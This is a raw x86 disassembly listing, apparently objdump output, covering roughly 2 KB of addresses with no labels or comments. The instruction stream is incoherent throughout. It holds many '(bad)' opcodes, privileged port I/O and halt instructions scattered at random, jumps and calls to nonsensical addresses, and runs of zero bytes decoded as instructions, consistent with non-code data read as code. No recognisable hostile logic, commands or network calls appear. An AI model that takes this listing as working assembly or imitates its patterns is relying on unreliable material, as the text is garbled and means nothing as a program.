  42b7fa:	jmp    0x5836c049
  42b7ff:	sub    al,BYTE PTR [eax]
  42b801:	pop    esp
  42b802:	jge    0x42b85f
  42b804:	cld    
  42b805:	cwde   
  42b806:	add    dl,BYTE PTR [ebx]
  42b808:	rol    BYTE PTR [eax],0x0
  42b80b:	add    BYTE PTR [eax],al
  42b80d:	add    BYTE PTR [ebx-0x183f8637],ah
  42b813:	clc    
  42b814:	scas   al,BYTE PTR es:[edi]
  42b815:	shl    BYTE PTR [ecx+ebp*2+0x48bbfff3],0x56
  42b81d:	pop    ebx
  42b81e:	les    edx,FWORD PTR gs:[ebx-0x75]
  42b822:	mov    eax,0x1f7ce686
  42b827:	add    al,BYTE PTR [eax]
  42b829:	push   ebx
  42b82a:	ret    0xb350
  42b82d:	add    BYTE PTR ds:0x59530002,cl
  42b833:	jp     0x42b8b3
  42b835:	std    
  42b836:	jnp    0x42b820
  42b838:	dec    edi
  42b839:	jmp    DWORD PTR [ecx+0x5]
  42b83c:	xor    eax,0x67
  42b83f:	add    ecx,DWORD PTR [esi-0x1]
  42b842:	in     al,dx
  42b843:	std    
  42b844:	test   al,al
  42b846:	inc    eax
  42b847:	add    edi,DWORD PTR [ebx+0x65]
  42b84a:	enter  0xe301,0x14
  42b84e:	dec    ecx
  42b84f:	ins    DWORD PTR es:[edi],dx
  42b850:	jg     0x42b84f
  42b852:	retf   
  42b853:	jmp    0x42b89f
  42b855:	push   0xffffff9c
  42b857:	xchg   dl,al
  42b859:	inc    esp
  42b85b:	enter  0xffd7,0xdb
  42b85f:	jns    0x42b8a4
  42b861:	or     al,0x17
  42b863:	add    BYTE PTR [ebx-0x73],cl
  42b866:	sub    DWORD PTR [edx+0x51dbfff8],eax
  42b86c:	div    DWORD PTR [ebp+0x74]
  42b86f:	push   eax
  42b870:	not    DWORD PTR [eax+0x0]
  42b873:	add    BYTE PTR [eax],al
  42b875:	add    BYTE PTR [eax],al
  42b877:	jne    0x42b868
  42b879:	xor    edi,ebx
  42b87b:	lock call 0xe71c:0x5ec056f
  42b883:	xchg   BYTE PTR [esi+0x7b],bl
  42b886:	adc    DWORD PTR [ebx+0x74],0xfffffff9
  42b88a:	dec    edi
  42b88b:	mov    ds:0x4dfacc58,al
  42b890:	xchg   esp,eax
  42b891:	(bad)  
  42b892:	cli    
  42b893:	cmp    dh,BYTE PTR [edx+0x3b]
  42b896:	sbb    dh,bh
  42b898:	fcom   QWORD PTR [ebx-0x73]
  42b89b:	clc    
  42b89c:	data16 clc 
  42b89e:	cli    
  42b89f:	and    cl,BYTE PTR [edx-0x6a868b09]
  42b8a5:	test   DWORD PTR [edi+0x69],0x6774c45e
  42b8ac:	dec    esi
  42b8ad:	jnp    0x42b832
  42b8af:	add    DWORD PTR [ecx+edi*8],esp
  42b8b2:	dec    edi
  42b8b3:	mov    ds:0xddfacc58,al
  42b8b8:	pop    ebx
  42b8b9:	xlat   BYTE PTR ds:[ebx]
  42b8ba:	cli    
  42b8bb:	jmp    0x4376:0x7b86fc5f
  42b8c2:	cld    
  42b8c3:	inc    esp
  42b8c4:	in     al,dx
  42b8c5:	imul   edx,DWORD PTR [eax],0x104ef42b
  42b8cb:	lock sbb dh,BYTE PTR [eax+0x4]
  42b8cf:	idiv   BYTE PTR ds:0xe4effff8
  42b8d5:	or     DWORD PTR [ebp+ebp*4+0x29],0x74f9
  42b8dd:	add    BYTE PTR [eax],al
  42b8df:	add    BYTE PTR [ecx-0x7ab006cb],al
  42b8e5:	pop    esi
  42b8e6:	mov    edi,0x5a587173
  42b8eb:	clc    
  42b8ec:	jne    0x42b92f
  42b8ee:	push   0xffffff8d
  42b8f0:	add    BYTE PTR [edi+0x57],ah
  42b8f3:	call   0xf962bae7
  42b8f8:	jg     0x42b951
  42b8fa:	push   ss
  42b8fb:	xchg   ecx,ebp
  42b8fd:	fidiv  DWORD PTR [eax]
  42b8ff:	in     al,dx
  42b900:	out    dx,eax
  42b901:	imul   ecx,DWORD PTR [edx-0x1eaa0408],0x2976c2bb
  42b90b:	add    al,0xf8
  42b90d:	jmp    0x42b96c
  42b90f:	repz jg 0x42b957
  42b912:	jb     0x42b992
  42b914:	xor    ah,bh
  42b916:	lods   al,BYTE PTR ds:[esi]
  42b917:	sar    DWORD PTR [ebx-0x5fc9e93],cl
  42b91d:	mov    edx,0x3df804dc
  42b922:	inc    ecx
  42b923:	test   BYTE PTR [ecx+0x6e51e8fe],ah
  42b929:	inc    ebp
  42b92a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b92b:	pop    es
  42b92c:	cli    
  42b92d:	jne    0x42b938
  42b92f:	push   esi
  42b930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b931:	jmp    0x42b8e6
  42b933:	div    DWORD PTR [edx-0x17f46415]
  42b939:	inc    ebp
  42b93a:	gs push ebx
  42b93c:	out    dx,al
  42b93d:	xor    al,0x12
  42b93f:	push   cs
  42b940:	aad    0x10
  42b942:	test   eax,0x3
  42b947:	add    BYTE PTR [eax],al
  42b949:	cli    
  42b94a:	retf   0xc16d
  42b94d:	shl    ch,cl
  42b94f:	push   es
  42b950:	clc    
  42b951:	iret   
  42b952:	jg     0x42b980
  42b954:	pop    ss
  42b955:	into   
  42b956:	jne    0x42b935
  42b958:	jmp    0x42b8fb
  42b95a:	lock loope 0x42b954
  42b95d:	mov    edi,0xc9ec0175
  42b962:	lock shl edi,1
  42b965:	inc    edi
  42b966:	ficomp DWORD PTR [ecx+0x21eb9ff2]
  42b96c:	push   esi
  42b96d:	inc    edx
  42b96e:	mov    ecx,0x557518a6
  42b973:	add    BYTE PTR [edx-0x63],ah
  42b976:	sub    bl,0x65
  42b979:	ja     0x42b97d
  42b97b:	add    BYTE PTR [edx],bh
  42b97d:	sub    ecx,DWORD PTR [edi+0x68]
  42b980:	popf   
  42b981:	(bad)  
  42b982:	sub    al,BYTE PTR [eax]
  42b984:	add    DWORD PTR [ebp-0x7c],ebx
  42b987:	aas    
  42b988:	jmp    0xe95f9ddb
  42b98d:	jbe    0x42b912
  42b98f:	out    dx,eax
  42b990:	mov    edx,0x81747a2f
  42b995:	mov    ds,ebx
  42b997:	or     ah,BYTE PTR [ebp+0x4a]
  42b99a:	add    al,BYTE PTR [eax]
  42b99c:	jmp    0xe8a8ba90
  42b9a1:	(bad)  
  42b9a2:	push   eax
  42b9a3:	mov    DWORD PTR [esi+ebp*1-0xa56b018],esi
  42b9aa:	stos   BYTE PTR es:[edi],al
  42b9ab:	or     ch,BYTE PTR [eax+eax*1+0x0]
  42b9af:	add    BYTE PTR [eax],al
  42b9b1:	add    BYTE PTR [edi],bh
  42b9b3:	add    al,BYTE PTR [eax]
  42b9b5:	jmp    0xa4cfbab9
  42b9ba:	adc    dl,BYTE PTR [edx+0x66]
  42b9bd:	fbstp  TBYTE PTR [eax-0xa02b019]
  42b9c3:	stos   BYTE PTR es:[edi],al
  42b9c4:	or     ah,BYTE PTR [ebx+esi*1+0x2]
  42b9c8:	add    cl,ch
  42b9ca:	(bad)  [ebx-0x7c891700]
  42b9d0:	inc    esp
  42b9d1:	add    eax,0x948d02ee
  42b9d6:	loop   0x42ba14
  42b9d8:	push   eax
  42b9d9:	mul    BYTE PTR [ecx]
  42b9db:	sub    al,BYTE PTR [ebp-0x7b7a85d7]
  42b9e1:	call   0x3c7bbc5c
  42b9e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b9e7:	test   DWORD PTR [ebx+0x27055],0x86ee3562
  42b9f1:	add    BYTE PTR [esp+esi*4-0x163ff06],ah
  42b9f8:	dec    ebp
  42b9f9:	lea    ebp,[ecx]
  42b9fb:	jg     0x42b9f5
  42b9fd:	call   ebx
  42b9ff:	push   eax
  42ba00:	push   0xa318ff0
  42ba05:	push   eax
  42ba06:	adc    ecx,DWORD PTR [edi+0x14]
  42ba09:	test   DWORD PTR [edx+ebx*2],ebx
  42ba0c:	add    eax,0xe1ee9189
  42ba11:	adc    esp,ecx
  42ba13:	cmp    BYTE PTR [edx-0x2],0x0
  42ba17:	add    BYTE PTR [eax],al
  42ba19:	add    BYTE PTR [eax],al
  42ba1b:	shl    eax,cl
  42ba1d:	dec    edx
  42ba1e:	push   ebx
  42ba1f:	fistp  QWORD PTR [ebp-0x3200170b]
  42ba25:	cmc    
  42ba26:	inc    ebp
  42ba28:	inc    edx
  42ba29:	lock mov ebx,ecx
  42ba2c:	icebp  
  42ba2d:	or     DWORD PTR [eax],0x80937aea
  42ba33:	mov    cl,0xf0
  42ba35:	cmc    
  42ba36:	push   edx
  42ba37:	inc    esp
  42ba38:	idiv   cl
  42ba3a:	xor    DWORD PTR [eax],ebp
  42ba3c:	push   esi
  42ba3d:	not    DWORD PTR [ecx+0x28]
  42ba40:	cmp    DWORD PTR [edx-0x8cae78c],0xffffffeb
  42ba47:	(bad)  
  42ba48:	jp     0x42b9cd
  42ba4a:	adc    BYTE PTR [ecx+0x2f50f5f0],0x85
  42ba51:	ret    0x74ff
  42ba54:	add    ebx,eax
  42ba56:	push   DWORD PTR [ebx+0x7c]
  42ba59:	repnz push 0xffffffe5
  42ba5c:	jp     0x42bad1
  42ba5e:	test   ah,ah
  42ba60:	frstor ds:0xb2efd378
  42ba66:	pop    eax
  42ba67:	sbb    BYTE PTR [esi],bh
  42ba69:	add    BYTE PTR [ebx+0x74f32bec],cl
  42ba6f:	jne    0x42ba4e
  42ba71:	xchg   edx,edx
  42ba73:	out    dx,al
  42ba74:	push   es
  42ba75:	hlt    
  42ba76:	xchg   BYTE PTR [eax],ah
  42ba78:	ret    
  42ba79:	cmp    bh,al
  42ba7b:	sbb    BYTE PTR [edi],0xcc
  42ba7e:	add    BYTE PTR ss:[eax],al
  42ba81:	add    BYTE PTR [eax],al
  42ba83:	add    BYTE PTR [esi+0x3c620627],al
  42ba89:	mov    ecx,0x3fbd056a
  42ba8e:	mov    BYTE PTR [edi],bh
  42ba90:	jne    0x42babf
  42ba92:	dec    edi
  42ba93:	push   eax
  42ba94:	clc    
  42ba95:	adc    eax,0x78cb4f80
  42ba9a:	or     ah,al
  42ba9c:	xchg   DWORD PTR [ebx],ebx
  42ba9e:	add    al,0x87
  42baa0:	sub    eax,0x5df83b56
  42baa5:	cmp    ebx,edi
  42baa7:	cli    
  42baa8:	inc    edx
  42baa9:	pop    esp
  42baaa:	ror    BYTE PTR [edi],0x3a
  42baad:	(bad)  
  42baae:	out    dx,al
  42baaf:	xchg   BYTE PTR ds:0x2af08a53,ah
  42bab5:	push   eax
  42bab6:	dec    ebp
  42bab7:	call   0xfb3804c1
  42babc:	test   BYTE PTR [eax-0xb],0x74
  42bac0:	jns    0x42bb1e
  42bac2:	pop    ebx
  42bac3:	hlt    
  42bac4:	jne    0x42baef
  42bac6:	cmp    esi,esp
  42bac8:	ja     0x42ba79
  42baca:	das    
  42bacb:	xchg   WORD PTR [esi+0x6b],bp
  42bacf:	les    ecx,FWORD PTR [ebp+0x13]
  42bad2:	shl    BYTE PTR [edx-0x16],0xf
  42bad6:	add    DWORD PTR [ebp+ebx*8-0x56],0x66
  42badb:	bnd jbe 0x42bb43
  42bade:	push   cs
  42badf:	push   0xd95dbc5
  42bae4:	pop    ebp
  42bae5:	out    0xff,al
  42bae7:	cdq    
  42bae8:	add    BYTE PTR [eax],al
  42baea:	add    BYTE PTR [eax],al
  42baec:	add    BYTE PTR [edi-0x7d],ah
  42baef:	in     eax,0xfe
  42baf1:	fld    DWORD PTR [ecx]
  42baf3:	imul   DWORD PTR [ebx-0x5b]
  42baf6:	add    al,0x81
  42baf8:	adc    edx,esi
  42bafa:	mov    edi,0xe6398938
  42baff:	sar    BYTE PTR [esi],0x98
  42bb02:	call   0xee7ca8c8
  42bb07:	in     al,0x6f
  42bb09:	pop    edx
  42bb0a:	pop    esp
  42bb0b:	cmp    BYTE PTR [edi-0x13ef2df7],al
  42bb11:	repz jo 0x42bab6
  42bb14:	hlt    
  42bb15:	add    DWORD PTR [esi],edi
  42bb17:	mov    eax,ds:0xe5f0dd53
  42bb1c:	mov    ebp,0x995a73
  42bb21:	xor    BYTE PTR [ecx+edx*1],dl
  42bb24:	out    dx,eax
  42bb25:	push   ebx
  42bb26:	mov    edx,0x45c6bd5
  42bb2b:	mov    al,ds:0xe5f2cd10
  42bb30:	mov    edi,0x532a7b6b
  42bb35:	cli    
  42bb36:	cmp    eax,0xe57eeb5d
  42bb3b:	push   ecx
  42bb3c:	hlt    
  42bb3d:	and    al,0x3e
  42bb3f:	push   ebp
  42bb40:	or     esp,DWORD PTR [ecx+0x73cf33]
  42bb46:	outs   dx,BYTE PTR ds:[esi]
  42bb47:	sbb    eax,0xba551d5b
  42bb4c:	hlt    
  42bb4d:	push   DWORD PTR [ebp-0x5d]
  42bb50:	sti    
  42bb51:	add    BYTE PTR [eax],al
  42bb53:	add    BYTE PTR [eax],al
  42bb55:	add    BYTE PTR [edx-0x64ffe4a6],ch
  42bb5b:	push   cs
  42bb5c:	xchg   ecx,eax
  42bb5d:	repz jmp 0x42bb7a
  42bb60:	std    
  42bb61:	imul   ebp,eax,0x3
  42bb64:	mov    ebx,0xe5d94d0f
  42bb69:	imul   ebx,DWORD PTR es:[edx-0x7],0xe92ff
  42bb71:	bound  eax,QWORD PTR [eax]
  42bb73:	cmp    BYTE PTR [edi-0x31203d5c],al
  42bb79:	in     eax,0xa6
  42bb7b:	in     al,dx
  42bb7c:	xchg   BYTE PTR [ecx+ecx*8+0x18],dl
  42bb80:	xlat   BYTE PTR ds:[ebx]
  42bb81:	bound  ebp,QWORD PTR [esi+eiz*8]
  42bb84:	xchg   cl,ah
  42bb86:	inc    esi
  42bb87:	jmp    0x42bbd9
  42bb89:	icebp  
  42bb8a:	adc    edi,DWORD PTR [esi]
  42bb8c:	in     al,dx
  42bb8d:	jb     0x42bb18
  42bb8f:	jbe    0x42bbe5
  42bb91:	mov    ch,0x2b
  42bb93:	push   edx
  42bb94:	sti    
  42bb95:	sbb    BYTE PTR [ebp+0x7d],bl
  42bb98:	mov    edi,0xfa3efaf6
  42bb9d:	sahf   
  42bb9e:	data16 add BYTE PTR [ebp+eax*4-0x1e],0xff
  42bba4:	dec    edi
  42bba5:	mov    es,eax
  42bba7:	cli    
  42bba8:	xchg   bh,ch
  42bbaa:	lods   al,BYTE PTR ds:[esi]
  42bbab:	jmp    0x42bbfc
  42bbad:	icebp  
  42bbae:	retf   
  42bbaf:	inc    esi
  42bbb0:	clc    
  42bbb1:	add    esp,DWORD PTR [edx+ecx*2-0x13b11f18]
  42bbb8:	cli    
  42bbb9:	mov    BYTE PTR [eax],0x0
  42bbbc:	add    BYTE PTR [eax],al
  42bbbe:	add    ah,al
  42bbc0:	dec    edi
  42bbc1:	leave  
  42bbc2:	sub    cl,ah
  42bbc4:	jg     0x42bbb1
  42bbc6:	push   0xe8ff7b15
  42bbcb:	jbe    0x42bc04
  42bbcd:	push   edx
  42bbce:	sahf   
  42bbcf:	cmc    
  42bbd0:	ins    DWORD PTR es:[edi],dx
  42bbd1:	les    edx,FWORD PTR [ecx+0x2d]
  42bbd4:	jno    0x42bbd1
  42bbd6:	ss push es
  42bbd8:	outs   dx,BYTE PTR ds:[esi]
  42bbd9:	or     al,0x62
  42bbdb:	das    
  42bbdc:	aaa    
  42bbdd:	rol    WORD PTR [ebx+0x75],1
  42bbe1:	mov    esp,0xfaebe795
  42bbe6:	add    DWORD PTR [eax],ebp
  42bbe8:	int3   
  42bbe9:	cli    
  42bbea:	push   cs
  42bbeb:	sub    BYTE PTR [ecx-0x7b],cl
  42bbee:	add    BYTE PTR [esp+esi*2-0x14ee74df],bl
  42bbf5:	or     DWORD PTR [eax],0x520c4959
  42bbfb:	push   edi
  42bbfc:	retf   
  42bbfd:	dec    esp
  42bbfe:	push   eax
  42bbff:	fwait
  42bc00:	lea    ecx,[esi-0x7afd6400]
  42bc06:	rol    BYTE PTR [ecx-0x18],0x81
  42bc0a:	jne    0x42bbc4
  42bc0c:	retf   0xf77d
  42bc0f:	mov    edx,0x8f02e1f3
  42bc14:	ret    0x5e55
  42bc17:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42bc19:	mov    esp,0x83498c08
  42bc1e:	in     al,dx
  42bc1f:	ffree  st(5)
  42bc21:	mov    esi,0x0
  42bc26:	add    BYTE PTR [eax],al
  42bc28:	pop    esp
  42bc29:	add    cl,BYTE PTR [ebx+0x56]
  42bc2c:	mov    ds:0xa3087c65,eax
  42bc31:	gs jmp 0x42bc8a
  42bc34:	inc    bp
  42bc36:	pop    eax
  42bc37:	call   0x38ad15
  42bc3c:	arpl   WORD PTR [eax+0x62],cx
  42bc3f:	outs   dx,BYTE PTR ds:[esi]
  42bc40:	aad    0x3a
  42bc42:	in     al,dx
  42bc43:	pop    eax
  42bc44:	les    eax,FWORD PTR [ecx+0x48cbfff5]
  42bc4a:	dec    esi
  42bc4b:	push   0x3b
  42bc4d:	addr16 inc esp
  42bc4f:	lock in al,0xc9
  42bc52:	imul   edi,edi,0x564df0bb
  42bc58:	es inc esi
  42bc5a:	mov    DWORD PTR [ebp-0x4c],eax
  42bc5d:	cmp    eax,ebp
  42bc5f:	dec    bx
  42bc61:	lock cmc 
  42bc63:	push   edi
  42bc64:	xor    cl,BYTE PTR [eax+0x6d]
  42bc67:	mov    DWORD PTR [ecx],edx
  42bc69:	mov    dh,0x52
  42bc6b:	call   0xfb306ee5
  42bc70:	fcmove st,st(0)
  42bc72:	leave  
  42bc73:	cmp    BYTE PTR [eax],dh
  42bc75:	(bad)  
  42bc77:	inc    esp
  42bc78:	int    0xd4
  42bc7a:	xchg   edi,eax
  42bc7b:	inc    esp
  42bc7c:	ret    0x4fb3
  42bc7f:	sti    
  42bc80:	push   0x5f
  42bc82:	xor    eax,0x75db7501
  42bc87:	pop    esp
  42bc88:	xchg   ebp,eax
  42bc89:	jb     0x42bcd6
  42bc8b:	in     al,0x0
  42bc8d:	add    BYTE PTR [eax],al
  42bc8f:	add    BYTE PTR [eax],al
  42bc91:	pop    esp
  42bc92:	fdiv   QWORD PTR cs:[ebx+0x6e]
  42bc96:	pusha  
  42bc97:	push   ebx
  42bc98:	call   0xe82ad39d
  42bc9d:	lock repz (bad) 
  42bca0:	(bad)  
  42bca1:	in     al,dx
  42bca2:	push   cs
  42bca3:	clc    
  42bca4:	cmp    BYTE PTR [eax],bl
  42bca6:	stos   DWORD PTR es:[edi],eax
  42bca7:	ja     0x42bccf
  42bca9:	(bad)  
  42bcab:	jp     0x42bd21
  42bcad:	inc    ebp
  42bcae:	inc    ebx
  42bcaf:	fdiv   st(6),st
  42bcb1:	call   0xe13dad42
  42bcb6:	mov    edi,DWORD PTR [ecx+eax*8-0x5b]
  42bcba:	adc    DWORD PTR [eax],eax
  42bcbc:	push   edi
  42bcbd:	clc    
  42bcbe:	in     eax,0x9e
  42bcc0:	out    0x56,eax
  42bcc2:	(bad)  
  42bcc3:	lock cli 
  42bcc5:	pushf  
  42bcc6:	adc    bh,BYTE PTR [ebx+0x44]
  42bcc9:	adc    eax,0xc0e7d970
  42bcce:	repz (bad) 
  42bcd0:	jmp    DWORD PTR [esi+0x30]
  42bcd3:	icebp  
  42bcd4:	je     0x42bcf3
  42bcd6:	pusha  
  42bcd7:	sub    esp,eax
  42bcd9:	addr16 fwait
  42bcdb:	(bad)  
  42bcdc:	cli    
  42bcdd:	and    al,BYTE PTR [edx]
  42bcdf:	dec    ebx
  42bce0:	clc    
  42bce1:	mov    DWORD PTR [ebx+eax*4+0x749574f7],esp
  42bce8:	xchg   DWORD PTR [ebp+0x75e36801],edi
  42bcee:	add    ch,cl
  42bcf0:	sbb    DWORD PTR [ebp-0x1],0xffffff9f
  42bcf4:	test   BYTE PTR [eax],al
  42bcf6:	add    BYTE PTR [eax],al
  42bcf8:	add    BYTE PTR [eax],al
  42bcfa:	lods   eax,DWORD PTR ds:[esi]
  42bcfb:	jecxz  0x42bca4
  42bcfd:	jbe    0x42bd53
  42bcff:	mov    ecx,ebp
  42bd01:	lds    esp,FWORD PTR [ebp-0x5ab89017]
  42bd07:	outs   dx,BYTE PTR ds:[esi]
  42bd08:	in     eax,dx
  42bd09:	xor    al,0xb5
  42bd0b:	fsub   st,st(3)
  42bd0d:	fistp  DWORD PTR [eax-0x2b]
  42bd10:	loope  0x42bd02
  42bd12:	std    
  42bd13:	ds mov ch,0x2c
  42bd16:	loop   0x42bd85
  42bd18:	sub    bh,BYTE PTR [ebp-0x4e]
  42bd1b:	js     0x42bd40
  42bd1d:	in     al,dx
  42bd1e:	call   0xa87d:0x8ff0a074
  42bd25:	ja     0x42bd6b
  42bd27:	ja     0x42bd54
  42bd29:	mov    esp,0x5516512a
  42bd2e:	outs   dx,BYTE PTR ds:[esi]
  42bd2f:	outs   dx,BYTE PTR ds:[esi]
  42bd30:	cmc    
  42bd31:	jle    0x42bce4
  42bd33:	shl    BYTE PTR ds:0x4d0e5e54,cl
  42bd39:	adc    esi,DWORD PTR [ebp+0x75eb6602]
  42bd3f:	ins    DWORD PTR es:[edi],dx
  42bd40:	(bad)  
  42bd42:	shl    DWORD PTR [esi-0x24d2b993],0x88
  42bd49:	fnstcw WORD PTR [edi]
  42bd4b:	in     al,0x69
  42bd4d:	jbe    0x42bd90
  42bd4f:	jp     0x42bcfc
  42bd51:	imul   DWORD PTR [edi]
  42bd53:	push   cs
  42bd54:	jno    0x42bd6b
  42bd56:	mov    ch,0x2
  42bd58:	push   edx
  42bd59:	jbe    0x42bd9c
  42bd5b:	fcmovnu st,st(1)
  42bd5d:	loopne 0x42bd5f
  42bd5f:	add    BYTE PTR [eax],al
  42bd61:	add    BYTE PTR [eax],al
  42bd63:	pmulhuw mm1,mm6
  42bd66:	pop    ebp
  42bd67:	clc    
  42bd68:	lods   eax,DWORD PTR ds:[esi]
  42bd69:	cld    
  42bd6a:	lock jmp ebx
  42bd6d:	call   DWORD PTR [eax+0x2e75391e]
  42bd73:	in     eax,0x5d
  42bd75:	outs   dx,DWORD PTR ds:[esi]
  42bd76:	je     0x42bddb
  42bd78:	stos   BYTE PTR es:[edi],al
  42bd79:	push   edi
  42bd7a:	adc    DWORD PTR [edx],edi
  42bd7c:	ins    DWORD PTR es:[edi],dx
  42bd7d:	sti    
  42bd7e:	push   ss
  42bd7f:	pop    ecx
  42bd80:	dec    esi
  42bd81:	hlt    
  42bd82:	bound  edx,QWORD PTR [ebx+0x1e1a36c6]
  42bd88:	dec    esp
  42bd89:	je     0x42bd34
  42bd8b:	jbe    0x42bd84
  42bd8d:	inc    ebx
  42bd8e:	sbb    DWORD PTR [ecx-0x115af545],ecx
  42bd94:	sub    bl,BYTE PTR [ebp-0x33]
  42bd97:	sub    eax,0x1ea785e4
  42bd9c:	outs   dx,BYTE PTR ds:[esi]
  42bd9d:	adc    BYTE PTR [ebx],bh
  42bd9f:	inc    eax
  42bda0:	push   edx
  42bda1:	sti    
  42bda2:	push   esp
  42bda3:	cdq    
  42bda4:	jbe    0x42bd2a
  42bda6:	add    eax,0xbefae89a
  42bdab:	cld    
  42bdac:	aad    0xfa
  42bdae:	cmp    al,0x79
  42bdb0:	xor    edi,ebx
  42bdb2:	mul    DWORD PTR [ebx-0x30]
  42bdb5:	xchg   cl,al
  42bdb7:	out    dx,al
  42bdb8:	shl    edi,0x55
  42bdbb:	xor    ebp,eax
  42bdbd:	cli    
  42bdbe:	push   0x2d
  42bdc0:	pop    es
  42bdc1:	sti    
  42bdc2:	adc    al,0x4d
  42bdc4:	fld    TBYTE PTR [ebx+0x97]
  42bdca:	add    BYTE PTR [eax],al
  42bdcc:	pop    edx
  42bdcd:	call   0x7c65b2cc
  42bdd2:	xor    al,0xb5
  42bdd4:	addr16 inc edx
  42bdd6:	add    BYTE PTR [esi+0x4b],ch
  42bdd9:	call   0xd15d1752
  42bdde:	cli    
  42bddf:	aam    0x3e
  42bde1:	call   0xc6df14b7
  42bde6:	cli    
  42bde7:	aaa    
  42bde8:	and    ch,BYTE PTR [esi-0x8]
  42bdeb:	add    BYTE PTR [ebx+0x434584cc],dh
  42bdf1:	xor    edx,DWORD PTR [esi+0x5b]
  42bdf4:	push   ebp
  42bdf5:	rol    BYTE PTR [esi],0x0
  42bdf8:	or     DWORD PTR [eax-0x19],ebp
  42bdfb:	add    DWORD PTR [eax-0x3300036a],0x1a0c4467
  42be05:	cmp    BYTE PTR [edx+0x73d40c2c],0x8
  42be0c:	inc    ecx
  42be0d:	jns    0x42be51
  42be0f:	std    
  42be10:	ret    
  42be11:	ror    DWORD PTR [edx-0x77],cl
  42be14:	adc    ebx,ebp
  42be16:	loop   0x42be3b
  42be18:	in     al,dx
  42be19:	shl    ebp,cl
  42be1b:	test   esp,ebx
  42be1d:	jecxz  0x42be9d
  42be1f:	jmp    0x8d42bcb1
  42be24:	or     DWORD PTR [edi],esp
  42be26:	std    
  42be27:	inc    ebx
  42be29:	dec    esi
  42be2a:	call   0xf6178733
  42be2f:	mov    eax,DWORD PTR [eax]
  42be31:	add    BYTE PTR [eax],al
  42be33:	add    BYTE PTR [eax],al
  42be35:	mov    esp,0x9f07465
  42be3a:	in     eax,dx
  42be3b:	add    eax,0x70c84
  42be40:	add    bh,ah
  42be42:	pop    es
  42be43:	lea    ecx,[ebp+0x50]
  42be46:	aaa    
  42be47:	dec    esi
  42be48:	(bad)  
  42be49:	fcomp  QWORD PTR [ecx-0x74a30006]
  42be4f:	mov    edx,0xff9ad90f
  42be54:	dec    DWORD PTR [ebp+ebx*2+0x44]
  42be58:	or     al,0xd7
  42be5a:	fisttp QWORD PTR [ebx+0x50341455]
  42be60:	(bad)  
  42be61:	in     eax,dx
  42be62:	adc    DWORD PTR [ebp-0x7274ec40],eax
  42be68:	add    DWORD PTR [ebp-0x15],esi
  42be6b:	dec    BYTE PTR [esi-0x56]
  42be6e:	lds    esp,FWORD PTR [ebp+ecx*4-0x80]
  42be72:	add    DWORD PTR [esi-0x18],0xffffffab
  42be76:	xchg   edi,eax
  42be77:	jmp    0xf6e9ad76
  42be7c:	gs repnz lds ecx,FWORD PTR fs:[edi+0x5f]
  42be82:	fld    DWORD PTR [esi-0x18]
  42be85:	imul   ebx,DWORD PTR [edi],0xffffffea
  42be88:	cli    
  42be89:	fidivr DWORD PTR [esi-0xa]
  42be8c:	xchg   BYTE PTR [eax+0x75400dcf],dl
  42be92:	push   esp
  42be93:	(bad)  
  42be94:	repnz sahf 
  42be96:	in     eax,0xc5
  42be98:	cli    
  42be99:	add    BYTE PTR [eax],al
  42be9b:	add    BYTE PTR [eax],al
  42be9d:	add    BYTE PTR [edx-0x6f53f27],ah
  42bea3:	pop    DWORD PTR [ebx]
  42bea5:	add    BYTE PTR [ebp+0x6c],dh
  42bea8:	arpl   WORD PTR [eax],cx
  42beaa:	jne    0x42bee1
  42beac:	lea    esp,gs:[eax]
  42beaf:	ja     0x42befc
  42beb1:	call   0xfb2ff629
  42beb6:	(bad)  
  42beb7:	add    BYTE PTR cs:[edi-0x27ac9193],al
  42bebe:	daa    
  42bebf:	ror    BYTE PTR fs:[ebp-0x3b],cl
  42bec3:	mov    al,0x8e
  42bec5:	xchg   ebx,eax
  42bec6:	jne    0x42beb3
  42bec8:	inc    BYTE PTR [ebp+esi*1-0x1f79050a]
  42becf:	xchg   ebx,eax
  42bed0:	(bad)  
  42bed2:	dec    ecx
  42bed3:	xchg   ecx,eax
  42bed4:	in     al,dx
  42bed5:	mov    BYTE PTR [eax-0x9fc2779],dh
  42bedb:	add    eax,0x3ccfff0
  42bee0:	jnp    0x42bf56
  42bee2:	add    eax,0xa6e6dbf3
  42bee7:	add    ah,BYTE PTR [edx-0x13]
  42beea:	sti    
  42beeb:	inc    esi
  42beec:	in     eax,dx
  42beed:	js     0x42bf61
  42beef:	(bad)  
  42bef0:	mov    ebx,0x328dc0e3
  42bef5:	push   edx
  42bef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bef7:	loope  0x42bf50
  42bef9:	cwde   
  42befa:	add    ah,cl
  42befc:	call   0xe4997987
  42bf01:	js     0x42bf03
  42bf03:	add    BYTE PTR [eax],al
  42bf05:	add    BYTE PTR [eax],al
  42bf07:	imul   esp,edx,0xdfe6ac40
  42bf0d:	and    DWORD PTR [ebx+0x39],edi
  42bf10:	fimul  DWORD PTR ds:0x11675a08
  42bf16:	add    al,0x5b
  42bf18:	imul   ebx,DWORD PTR [edi+esi*4+0x3a],0xffffffe1
  42bf1d:	add    ebp,ebp
  42bf1f:	sub    ch,dl
  42bf21:	xor    esi,DWORD PTR [ecx-0x42]
  42bf24:	loopne 0x42bf83
  42bf26:	ja     0x42bed5
  42bf28:	mov    WORD PTR [ebx-0x22b90c11],ss
  42bf2e:	xchg   BYTE PTR [edx+ebx*4+0x2357840],ah
  42bf35:	loop   0x42bf7e
  42bf37:	test   BYTE PTR [esi-0x4cc9034a],al
  42bf3d:	gs ret 
  42bf3f:	jbe    0x42becc
  42bf41:	and    edx,eax
  42bf43:	repz add DWORD PTR [ebx+eax*8-0x1a],ebp
  42bf48:	or     eax,DWORD PTR [ebx-0x7f]
  42bf4b:	mov    ds:0x1c071d02,al
  42bf50:	aas    
  42bf51:	ins    DWORD PTR es:[edi],dx
  42bf52:	inc    ebx
  42bf53:	jne    0x42bf8d
  42bf55:	aaa    
  42bf56:	push   ebx
  42bf57:	add    BYTE PTR [esi-0x1fb012c8],al
  42bf5d:	sbb    BYTE PTR [edi-0x47],bh
  42bf60:	or     bl,BYTE PTR [ecx]
  42bf62:	fcom   QWORD PTR [ebx-0x41]
  42bf65:	push   DWORD PTR [ebp+0x21]
  42bf68:	popa   
  42bf69:	(bad)  
  42bf6a:	aad    0x0
  42bf6c:	add    BYTE PTR [eax],al
